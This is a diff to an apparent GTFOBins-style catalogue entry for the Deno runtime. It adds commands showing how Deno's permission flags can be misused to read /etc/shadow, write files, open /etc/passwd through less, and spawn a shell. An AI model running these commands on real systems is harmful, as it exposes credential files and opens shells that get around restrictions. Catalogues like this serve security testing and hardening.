@@ -1,27 +1,43 @@
 ---
 comment: |-
-  deno is a modern JavaScript/TypeScript runtime. It can be abused to run arbitrary scripts, fetch remote code, and escalate privileges via permission flags.
+  Deno is a modern JavaScript/TypeScript runtime. It can be abused to run arbitrary scripts,
+  fetch remote code, and escalate privileges via permission flags.
 functions:
   file-read:
   - code: |-
-      deno run --allow-read=/etc/shadow read.js
+      deno run --allow-read=/etc/shadow - <<'EOF'
+      console.log(Deno.readTextFileSync("/etc/shadow"))
+      EOF
     contexts:
       unprivileged:
         comment: |-
-          Reads sensitive files if permission flags are enabled.
+          Reads sensitive files if `--allow-read` is granted.
   file-write:
   - code: |-
-      deno run --allow-write=/tmp/write.js
+      deno run --allow-write=/tmp - <<'EOF'
+      Deno.writeTextFileSync("/tmp/pwned.txt", "owned")
+      EOF
     contexts:
       unprivileged:
         comment: |-
-          Writes arbitrary content to files when allowed.
+          Writes arbitrary content to files when `--allow-write` is granted.
   inherit:
   - code: |-
-      deno run --allow-run=less pager.js
-    comment: |-
-      The `--allow-run` flag permits spawning external programs. This can be abused to inherit execution from system binaries like `less`.
+      deno run --allow-run=less - <<'EOF'
+      Deno.run({ cmd: ["less", "/etc/passwd"] })
+      EOF
     contexts:
       unprivileged:
+        comment: |-
+          The `--allow-run` flag permits spawning external programs. This can be abused to inherit execution from system binaries like `less`.
     from: less
+  shell:
+  - code: |-
+      deno run -A - <<'EOF'
+      Deno.run({ cmd: ["sh"] })
+      EOF
+    contexts:
+      unprivileged:
+        comment: |-
+          Spawns a shell when all permissions are enabled (`-A`).
 ...
